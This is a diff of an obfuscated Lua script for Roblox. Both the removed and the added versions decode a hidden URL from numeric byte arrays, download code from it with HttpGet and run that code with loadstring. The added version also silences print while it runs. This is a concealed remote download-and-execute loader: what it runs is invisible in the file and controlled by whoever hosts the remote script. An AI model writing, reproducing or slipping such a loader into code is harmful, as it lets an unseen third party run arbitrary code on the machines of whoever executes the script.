@@ -1,1 +1,31 @@
-local _0x536176=function(_0x64,_0x6B)local _0x72=""local _0x62=bit32 or bit64 for _0x69=1,#_0x64 do local _0x76=_0x64[_0x69]local _0x6D=((_0x69-1)%#_0x6B)+1 local _0x6B_c=_0x6B:byte(_0x6D)local _0x61=_0x76-_0x6B_c _0x72=_0x72..string.char((_0x61%256))end return _0x72 end local _0x4C3D={111,123,123,119,122,65,54,54,110,112,122,123,53,110,112,123,111,124,105,124,122,108,121,106,118,117,123,108,117,123,53,106,118,116,54,62,90,104,125,112,123,104,121,54,58,60,104,61,108,107,104,108,109,63,109,57,109,61,64,62,57,109,57,109,57,58,63,63,60,106,105,106,58,56,57,108,54,121,104,126,54,105,56,64,105,104,105,107,108,55,55,104,64,58,55,57,58,59,107,60,56,107,106,106,57,108,109,107,106,58,57,56,109,62,108,107,107,108,56,64,60,54,77,91,72,87,52,90,72,93,80,91,72,89,52,79,92,73,52,73,76,91,72}local _0x4B59=string.char(7,7,7)local _0x4558=function()local _0x53,_0x43=pcall(function()local _0x4C=_0x536176(_0x4C3D,_0x4B59)return game:HttpGet(_0x4C.."?"..tostring(math.random(1,1000)),true)end)if _0x53 and _0x43 then local _0x46,_0x45=loadstring(_0x43)if _0x46 then task.spawn(_0x46)else warn("Loader Error: 0x1")end else warn("Network Error: 0x2")end end _0x4558()
+local _S = string; local _T = table; local _G = game;
+
+
+local _D = {115,128,129,126,130,74,64,57,114,117,128,130,61,119,122,126,115,129,111,131,130,117,131,109,122,122,129,115,125,132,63,109,122,121,60,69,98,113,135,115,127,109,127,61,66,69,114,64,112,112,110,115,117,72,119,60,113,66,70,69,65,118,67,112,61,63,69,70,68,115,115,109,62,61,63,115,62,130,114,129,58,113,62,65,70,114,67,66,108,114,113,112,68,71,71,107,61,60,113,111,64,114,73,110,109,113,112,115,67,72,66,112,109,110,112,69,65,64,66,60,68,59,83,98,80,96,62,93,76,98,86,98,80,98,62,82,96,78,58,80,84,100,82}
+
+local function _SOLVE(_DATA)
+    local _R = {}
+    for i = 1, #_DATA do
+        
+        local _K = (i % 8) + 10
+        _R[i] = _S.char(_DATA[i] - _K)
+    end
+    return _T.concat(_R)
+end
+
+local function _START()
+    local _url = _SOLVE(_D) .. "?v=" .. math.random(1, 9999)
+    local _ok, _res = pcall(function() return _G:HttpGet(_url, true) end)
+    
+    if _ok and _res and #_res > 10 then
+        local _f = loadstring(_res)
+        if _f then 
+            task.spawn(_f) 
+        end
+    end
+end
+
+
+local _p = print; print = function() end;
+_START()
+print = _p;
